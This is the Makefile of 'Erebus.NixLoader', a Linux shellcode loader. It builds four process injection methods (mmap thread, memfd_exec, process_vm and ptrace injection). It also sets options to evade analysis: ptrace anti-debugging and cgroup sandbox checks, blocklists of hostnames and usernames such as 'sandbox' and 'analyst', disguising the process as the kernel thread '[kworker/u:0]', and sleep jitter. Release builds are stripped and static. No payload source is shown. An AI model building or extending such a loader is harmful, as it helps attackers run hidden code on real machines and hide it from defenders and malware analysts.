# Erebus.NixLoader - Linux ELF/SO shellcode loader
#
# Build variables (all overridable from command line):
#   ARCH           x86_64 (default) | aarch64
#   TARGET         elf (default) | so
#   BUILD          release (default) | debug
#   INJECTION_TYPE 1=mmap_thread  2=memfd_exec  3=process_vm  4=ptrace_inject
#
# Guardrail toggles (all default 0 = disabled):
#   CONFIG_GUARDRAILS_ENABLED  0|1
#   CONFIG_CHECK_PTRACE        0|1
#   CONFIG_CHECK_CGROUP        0|1
#   CONFIG_MASQUERADE_ENABLED  0|1
#   CONFIG_MASQUERADE_NAME     string (quoted on shell, passed as -D)
#   CONFIG_BLOCKED_HOSTNAMES   C-array initialiser e.g. {"sandbox","malware"}
#   CONFIG_BLOCKED_USERNAMES   C-array initialiser e.g. {"analyst","malware"}
#   CONFIG_SLEEP_MS            milliseconds (0 = no sleep)
#   CONFIG_SLEEP_JITTER_MS     jitter window in ms

ARCH           ?= x86_64
TARGET         ?= elf
BUILD          ?= release
INJECTION_TYPE ?= 1

CONFIG_GUARDRAILS_ENABLED ?= 0
CONFIG_CHECK_PTRACE       ?= 1
CONFIG_CHECK_CGROUP       ?= 1
CONFIG_MASQUERADE_ENABLED ?= 0
CONFIG_MASQUERADE_NAME    ?= [kworker/u:0]
CONFIG_SLEEP_MS           ?= 0
CONFIG_SLEEP_JITTER_MS    ?= 0

OUT_ELF := erebus_nix
OUT_SO  := erebus_nix.so

SRCS := src/main.c \
        src/loader.c \
        src/evasion/guardrails.c \
        src/injection/mmap_thread.c \
        src/injection/memfd_exec.c \
        src/injection/process_vm.c \
        src/injection/ptrace_inject.c

OBJS := $(SRCS:.c=.o)

CFLAGS_COMMON := \
    -I include \
    -std=c11 \
    -Wall \
    -Wno-unused-function \
    -Wno-unused-variable \
    -fno-stack-protector \
    -fvisibility=hidden \
    -DCONFIG_INJECTION_TYPE=$(INJECTION_TYPE) \
    -DCONFIG_GUARDRAILS_ENABLED=$(CONFIG_GUARDRAILS_ENABLED) \
    -DCONFIG_CHECK_PTRACE=$(CONFIG_CHECK_PTRACE) \
    -DCONFIG_CHECK_CGROUP=$(CONFIG_CHECK_CGROUP) \
    -DCONFIG_MASQUERADE_ENABLED=$(CONFIG_MASQUERADE_ENABLED) \
    -DCONFIG_MASQUERADE_NAME='"$(CONFIG_MASQUERADE_NAME)"' \
    -DCONFIG_SLEEP_MS=$(CONFIG_SLEEP_MS) \
    -DCONFIG_SLEEP_JITTER_MS=$(CONFIG_SLEEP_JITTER_MS)

ifeq ($(BUILD),release)
    CFLAGS := $(CFLAGS_COMMON) -Os -ffunction-sections -fdata-sections -fPIE
    LDFLAGS_ELF := -Wl,--gc-sections -s -static -pie
    LDFLAGS_SO  := -Wl,--gc-sections -s -shared
else
    CFLAGS := $(CFLAGS_COMMON) -g -O0 -fPIE
    LDFLAGS_ELF := -pie
    LDFLAGS_SO  := -shared
endif

ifeq ($(ARCH),aarch64)
    CC := aarch64-linux-gnu-gcc
else
    CC := gcc
endif

# Append optional list macros only when set
ifdef CONFIG_BLOCKED_HOSTNAMES
    CFLAGS += -DCONFIG_BLOCKED_HOSTNAMES='$(CONFIG_BLOCKED_HOSTNAMES)'
endif
ifdef CONFIG_BLOCKED_USERNAMES
    CFLAGS += -DCONFIG_BLOCKED_USERNAMES='$(CONFIG_BLOCKED_USERNAMES)'
endif

.PHONY: all elf so clean

all: $(TARGET)

elf: $(OBJS)
	$(CC) $(OBJS) $(LDFLAGS_ELF) -lpthread -o $(OUT_ELF)

so: CFLAGS += -fPIC
so: $(OBJS)
	$(CC) $(OBJS) $(LDFLAGS_SO) -lpthread -o $(OUT_SO)

%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

clean:
	rm -f $(OBJS) $(OUT_ELF) $(OUT_SO)
